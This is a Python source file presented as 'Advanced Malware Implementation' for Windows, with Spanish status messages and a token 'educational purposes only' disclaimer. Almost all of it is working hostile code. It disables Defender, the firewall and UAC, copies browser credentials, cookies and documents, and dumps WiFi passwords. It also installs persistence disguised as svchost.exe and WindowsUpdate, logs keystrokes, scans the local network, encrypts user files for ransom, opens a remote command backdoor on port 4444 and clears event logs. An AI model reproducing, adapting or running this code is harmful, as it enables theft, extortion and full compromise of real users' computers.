#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Malware Implementation
⚠️ WARNING: This is for educational purposes only!
"""

import os
import sys
import time
import json
import shutil
import socket
import threading
import subprocess
import winreg
import base64
import hashlib
import requests
import psutil
import pynput
from pynput import keyboard
from cryptography.fernet import Fernet
import zipfile
import tempfile
from pathlib import Path

class AdvancedMalware:
    def __init__(self):
        self.victim_name = "[Tu Nombre]"
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.stolen_data = []
        self.keylog_data = []
        self.is_running = True
        
    def infect(self):
        """Main infection function"""
        print(f"🦠 Infectado por {self.victim_name}")
        print("🚀 Iniciando operaciones maliciosas...")
        
        # Execute all malicious functions
        self.disable_security()
        self.steal_data()
        self.install_persistence()
        self.start_keylogger()
        self.start_crypto_mining()
        self.scan_network()
        self.encrypt_files()
        
        # Keep running
        self.maintain_persistence()
    
    def disable_security(self):
        """Disable Windows security features"""
        print("🔓 Desactivando seguridad del sistema...")
        
        try:
            # Disable Windows Defender
            subprocess.run([
                "powershell", "-Command", 
                "Set-MpPreference -DisableRealtimeMonitoring $true"
            ], capture_output=True)
            
            # Disable Windows Firewall
            subprocess.run([
                "netsh", "advfirewall", "set", "allprofiles", "state", "off"
            ], capture_output=True)
            
            # Disable UAC
            subprocess.run([
                "reg", "add", 
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f"
            ], capture_output=True)
            
            # Disable Windows Update
            subprocess.run([
                "reg", "add",
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU",
                "/v", "NoAutoUpdate", "/t", "REG_DWORD", "/d", "1", "/f"
            ], capture_output=True)
            
            # Disable SmartScreen
            subprocess.run([
                "reg", "add",
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
                "/v", "SmartScreenEnabled", "/t", "REG_SZ", "/d", "Off", "/f"
            ], capture_output=True)
            
            print("✅ Seguridad desactivada exitosamente")
            
        except Exception as e:
            print(f"❌ Error desactivando seguridad: {e}")
    
    def steal_data(self):
        """Steal sensitive data from the system"""
        print("📁 Robando datos del sistema...")
        
        # Browser data paths
        browser_paths = [
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default"),
            os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        ]
        
        stolen_files = []
        
        for browser_path in browser_paths:
            if os.path.exists(browser_path):
                try:
                    # Copy login data, cookies, bookmarks
                    for file in ["Login Data", "Cookies", "Bookmarks", "History"]:
                        src = os.path.join(browser_path, file)
                        if os.path.exists(src):
                            dst = f"stolen_{file}_{int(time.time())}"
                            shutil.copy2(src, dst)
                            stolen_files.append(dst)
                            
                except Exception as e:
                    print(f"Error robando datos del navegador: {e}")
        
        # Steal documents
        doc_paths = [
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Pictures")
        ]
        
        for doc_path in doc_paths:
            if os.path.exists(doc_path):
                try:
                    for file in os.listdir(doc_path):
                        if file.endswith(('.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.jpg', '.png', '.zip')):
                            src = os.path.join(doc_path, file)
                            dst = f"stolen_{file}_{int(time.time())}"
                            shutil.copy2(src, dst)
                            stolen_files.append(dst)
                            
                except Exception as e:
                    print(f"Error robando documentos: {e}")
        
        # Steal WiFi passwords
        try:
            result = subprocess.run([
                "netsh", "wlan", "export", "profile", "key=clear", "folder=."
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✅ Contraseñas WiFi robadas")
                
        except Exception as e:
            print(f"Error robando WiFi: {e}")
        
        # Steal system information
        try:
            system_info = {
                'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
                'username': os.environ.get('USERNAME', 'Unknown'),
                'os_version': os.environ.get('OS', 'Unknown'),
                'processor': os.environ.get('PROCESSOR_IDENTIFIER', 'Unknown'),
                'memory': psutil.virtual_memory().total,
                'timestamp': time.time()
            }
            
            with open(f"system_info_{int(time.time())}.json", 'w') as f:
                json.dump(system_info, f, indent=2)
                
            stolen_files.append(f"system_info_{int(time.time())}.json")
            
        except Exception as e:
            print(f"Error robando información del sistema: {e}")
        
        self.stolen_data = stolen_files
        print(f"✅ Robados {len(stolen_files)} archivos")
    
    def install_persistence(self):
        """Install persistence mechanisms"""
        print("🔄 Instalando persistencia...")
        
        try:
            # Copy to system directory
            current_file = os.path.abspath(__file__)
            system_path = os.path.join(os.environ['WINDIR'], 'System32', 'svchost.exe')
            
            # Create a copy with system name
            shutil.copy2(current_file, system_path)
            
            # Add to startup registry
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, system_path)
            winreg.CloseKey(key)
            
            # Add to startup folder
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            startup_file = os.path.join(startup_path, 'WindowsUpdate.bat')
            
            with open(startup_file, 'w') as f:
                f.write(f'python "{system_path}"\n')
            
            # Add to services (requires admin)
            try:
                subprocess.run([
                    "sc", "create", "WindowsUpdate", 
                    f"binPath= python {system_path}",
                    "start= auto"
                ], capture_output=True)
            except:
                pass
            
            # Add to scheduled tasks
            try:
                subprocess.run([
                    "schtasks", "/create", "/tn", "WindowsUpdate",
                    "/tr", f"python {system_path}",
                    "/sc", "onstart", "/f"
                ], capture_output=True)
            except:
                pass
            
            print("✅ Persistencia instalada")
            
        except Exception as e:
            print(f"❌ Error instalando persistencia: {e}")
    
    def start_keylogger(self):
        """Start keylogging functionality"""
        print("⌨️ Iniciando keylogger...")
        
        def on_press(key):
            try:
                self.keylog_data.append({
                    'key': str(key),
                    'timestamp': time.time(),
                    'process': psutil.Process().name()
                })
                
                # Save keylog data periodically
                if len(self.keylog_data) > 100:
                    self.save_keylog_data()
                    
            except Exception as e:
                pass
        
        def on_release(key):
            if key == keyboard.Key.esc:
                return False
        
        # Start keylogger in separate thread
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        
        print("✅ Keylogger activo")
    
    def save_keylog_data(self):
        """Save keylog data to file"""
        try:
            with open(f"keylog_{int(time.time())}.json", 'w') as f:
                json.dump(self.keylog_data, f, indent=2)
            self.keylog_data = []
        except Exception as e:
            print(f"Error guardando keylog: {e}")
    
    def start_crypto_mining(self):
        """Start cryptocurrency mining"""
        print("⛏️ Iniciando minería de criptomonedas...")
        
        def mine_crypto():
            # Simple CPU mining simulation
            while self.is_running:
                try:
                    # Simulate mining work
                    hash_input = f"block_{int(time.time())}_{os.urandom(16).hex()}"
                    hash_result = hashlib.sha256(hash_input.encode()).hexdigest()
                    
                    # Use CPU for mining
                    time.sleep(0.1)
                    
                except Exception as e:
                    break
        
        # Start mining in separate thread
        mining_thread = threading.Thread(target=mine_crypto, daemon=True)
        mining_thread.start()
        
        print("✅ Minería iniciada")
    
    def scan_network(self):
        """Scan network for other targets"""
        print("🌐 Escaneando red...")
        
        def scan_network():
            try:
                # Get local network range
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                network = '.'.join(local_ip.split('.')[:-1])
                
                # Scan common ports
                ports = [22, 23, 80, 135, 139, 443, 445, 3389]
                
                for i in range(1, 255):
                    target_ip = f"{network}.{i}"
                    
                    for port in ports:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(0.1)
                            result = sock.connect_ex((target_ip, port))
                            
                            if result == 0:
                                print(f"🎯 Objetivo encontrado: {target_ip}:{port}")
                                
                            sock.close()
                            
                        except Exception:
                            pass
                            
            except Exception as e:
                print(f"Error escaneando red: {e}")
        
        # Start network scan in separate thread
        scan_thread = threading.Thread(target=scan_network, daemon=True)
        scan_thread.start()
        
        print("✅ Escaneo de red iniciado")
    
    def encrypt_files(self):
        """Encrypt important files for ransom"""
        print("🔐 Encriptando archivos...")
        
        try:
            # Target important directories
            target_dirs = [
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Desktop"),
                os.path.expanduser("~\\Pictures")
            ]
            
            encrypted_count = 0
            
            for target_dir in target_dirs:
                if os.path.exists(target_dir):
                    for root, dirs, files in os.walk(target_dir):
                        for file in files:
                            if file.endswith(('.txt', '.doc', '.docx', '.pdf', '.jpg', '.png')):
                                try:
                                    file_path = os.path.join(root, file)
                                    
                                    # Read and encrypt file
                                    with open(file_path, 'rb') as f:
                                        data = f.read()
                                    
                                    encrypted_data = self.cipher.encrypt(data)
                                    
                                    # Write encrypted data
                                    with open(file_path, 'wb') as f:
                                        f.write(encrypted_data)
                                    
                                    # Rename with .encrypted extension
                                    os.rename(file_path, f"{file_path}.encrypted")
                                    
                                    encrypted_count += 1
                                    
                                except Exception as e:
                                    continue
            
            print(f"✅ {encrypted_count} archivos encriptados")
            
        except Exception as e:
            print(f"❌ Error encriptando archivos: {e}")
    
    def maintain_persistence(self):
        """Keep the malware running"""
        print("🔄 Manteniendo persistencia...")
        
        while self.is_running:
            try:
                # Check if we're still in startup
                time.sleep(60)  # Check every minute
                
                # Re-enable if disabled
                self.disable_security()
                
                # Continue data theft
                if len(self.stolen_data) < 50:  # Limit to avoid detection
                    self.steal_data()
                
            except KeyboardInterrupt:
                self.is_running = False
            except Exception as e:
                print(f"Error en persistencia: {e}")
                time.sleep(10)
    
    def create_backdoor(self):
        """Create a backdoor for remote access"""
        print("🚪 Creando backdoor...")
        
        def backdoor_server():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(('0.0.0.0', 4444))
                server.listen(1)
                
                print("✅ Backdoor escuchando en puerto 4444")
                
                while self.is_running:
                    client, addr = server.accept()
                    print(f"🔗 Conexión desde {addr}")
                    
                    # Handle commands
                    while True:
                        command = client.recv(1024).decode()
                        if not command:
                            break
                        
                        try:
                            result = subprocess.run(
                                command, shell=True, 
                                capture_output=True, text=True
                            )
                            client.send(result.stdout.encode())
                        except Exception as e:
                            client.send(str(e).encode())
                    
                    client.close()
                    
            except Exception as e:
                print(f"Error en backdoor: {e}")
        
        # Start backdoor in separate thread
        backdoor_thread = threading.Thread(target=backdoor_server, daemon=True)
        backdoor_thread.start()
    
    def destroy_evidence(self):
        """Destroy evidence of malware activity"""
        print("🧹 Destruyendo evidencia...")
        
        try:
            # Clear event logs
            subprocess.run([
                "wevtutil", "cl", "System"
            ], capture_output=True)
            
            subprocess.run([
                "wevtutil", "cl", "Application"
            ], capture_output=True)
            
            subprocess.run([
                "wevtutil", "cl", "Security"
            ], capture_output=True)
            
            # Clear temp files
            temp_dir = tempfile.gettempdir()
            for file in os.listdir(temp_dir):
                if file.startswith('stolen_') or file.startswith('keylog_'):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass
            
            print("✅ Evidencia destruida")
            
        except Exception as e:
            print(f"❌ Error destruyendo evidencia: {e}")

def main():
    """Main execution function"""
    print("=" * 50)
    print("🦠 ADVANCED MALWARE ACTIVATED 🦠")
    print("=" * 50)
    
    # Create and run malware
    malware = AdvancedMalware()
    
    try:
        malware.infect()
    except KeyboardInterrupt:
        print("\n🛑 Malware detenido por usuario")
        malware.is_running = False
    except Exception as e:
        print(f"❌ Error crítico: {e}")
    
    print("👋 Malware finalizado")

if __name__ == "__main__":
    main()